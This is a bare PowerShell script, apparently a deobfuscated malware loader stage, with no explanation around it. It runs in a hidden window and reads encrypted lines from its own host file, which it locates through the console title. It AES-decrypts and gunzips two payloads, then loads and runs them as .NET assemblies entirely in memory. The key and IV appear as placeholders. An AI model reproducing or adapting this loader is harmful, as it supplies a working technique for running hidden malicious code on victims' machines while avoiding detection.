powershell -w hidden;
function decrypt_function($param_var)
{
	$aes_var=[System.Security.Cryptography.Aes]::Create();
	$aes_var.Mode=[System.Security.Cryptography.CipherMode]::CBC;
	$aes_var.Padding=[System.Security.Cryptography.PaddingMode]::PKCS7;
	$aes_var.Key=[System.Convert]::FromBase64String('key_str');
	$aes_var.IV=[System.Convert]::FromBase64String('iv_str');
	$decryptor_var=$aes_var.CreateDecryptor();
	$return_var=$decryptor_var.TransformFinalBlock($param_var,0,$param_var.Length);
	$decryptor_var.Dispose();
	$aes_var.Dispose();
	$return_var;
}

function decompress_function($param_var)
{
	$msi_var=New-Object System.IO.MemoryStream(,$param_var);
	$mso_var=New-Object System.IO.MemoryStream;
	$gs_var=New-Object System.IO.Compression.GZipStream($msi_var,[IO.Compression.CompressionMode]::Decompress);
	$gs_var.CopyTo($mso_var);
	$gs_var.Dispose();
	$msi_var.Dispose();
	$mso_var.Dispose();
	$mso_var.ToArray();
}

$line_var=[System.IO.File]::ReadLines([Console]::Title);
$payload1_var=decompress_function (decrypt_function ([Convert]::FromBase64String([System.Linq.Enumerable]::ElementAt($line_var, 5).Substring(2))));
$payload2_var=decompress_function (decrypt_function ([Convert]::FromBase64String([System.Linq.Enumerable]::ElementAt($line_var, 6).Substring(2))));
[System.Reflection.Assembly]::Load([byte[]]$payload2_var).EntryPoint.Invoke($null,$null);
[System.Reflection.Assembly]::Load([byte[]]$payload1_var).EntryPoint.Invoke($null,$null);